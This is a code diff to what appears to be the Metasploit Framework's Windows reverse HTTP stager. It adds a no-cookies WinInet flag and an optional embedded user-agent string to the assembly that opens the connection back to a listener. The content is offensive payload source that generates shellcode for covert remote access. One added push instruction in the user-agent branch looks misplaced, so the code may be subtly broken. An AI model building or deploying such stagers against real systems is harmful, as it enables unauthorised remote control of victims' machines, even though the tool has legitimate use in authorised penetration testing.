@@ -1,11 +1,5 @@
 # -*- coding: binary -*-
 
-require 'msf/core'
-require 'msf/core/payload/transport_config'
-require 'msf/core/payload/windows/block_api'
-require 'msf/core/payload/windows/exitfunk'
-require 'msf/core/payload/uuid/options'
-
 module Msf
 
 ###
@@ -218,6 +212,7 @@ module Payload::Windows::ReverseHttp
         0x04000000 | # INTERNET_NO_CACHE_WRITE
         0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
         0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
+        0x00080000 | # INTERNET_FLAG_NO_COOKIES
         0x00000200 | # INTERNET_FLAG_NO_UI
         0x00800000 | # INTERNET_FLAG_SECURE
         0x00002000 | # INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
@@ -235,6 +230,7 @@ module Payload::Windows::ReverseHttp
         0x04000000 | # INTERNET_NO_CACHE_WRITE
         0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
         0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
+        0x00080000 | # INTERNET_FLAG_NO_COOKIES
         0x00000200 ) # INTERNET_FLAG_NO_UI
     end
 
@@ -255,32 +251,43 @@ module Payload::Windows::ReverseHttp
         xor ebx, ebx           ; Set ebx to NULL to use in future arguments
     ^
 
+    asm << %Q^
+    internetopen:
+      push ebx               ; DWORD dwFlags
+    ^
     if proxy_enabled
       asm << %Q^
-      internetopen:
-        push ebx               ; DWORD dwFlags
         push esp               ; LPCTSTR lpszProxyBypass ("" = empty string)
       call get_proxy_server
         db "#{proxy_info}", 0x00
       get_proxy_server:
                                ; LPCTSTR lpszProxyName (via call)
         push 3                 ; DWORD dwAccessType (INTERNET_OPEN_TYPE_PROXY = 3)
-        push ebx               ; LPCTSTR lpszAgent (NULL)
-        push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
-        call ebp
       ^
     else
       asm << %Q^
-      internetopen:
-        push ebx               ; DWORD dwFlags
         push ebx               ; LPCTSTR lpszProxyBypass (NULL)
         push ebx               ; LPCTSTR lpszProxyName (NULL)
         push ebx               ; DWORD dwAccessType (PRECONFIG = 0)
-        push ebx               ; LPCTSTR lpszAgent (NULL)
-        push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
-        call ebp
       ^
     end
+    if opts[:ua].nil?
+      asm << %Q^
+        push ebx               ; LPCTSTR lpszAgent (NULL)
+      ^
+    else
+      asm << %Q^
+        push ebx               ; LPCTSTR lpszProxyBypass (NULL)
+      call get_useragent
+        db "#{opts[:ua]}", 0x00
+                               ; LPCTSTR lpszAgent (via call)
+      get_useragent:
+      ^
+    end
+    asm << %Q^
+      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
+      call ebp
+    ^
 
     asm << %Q^
       internetconnect:
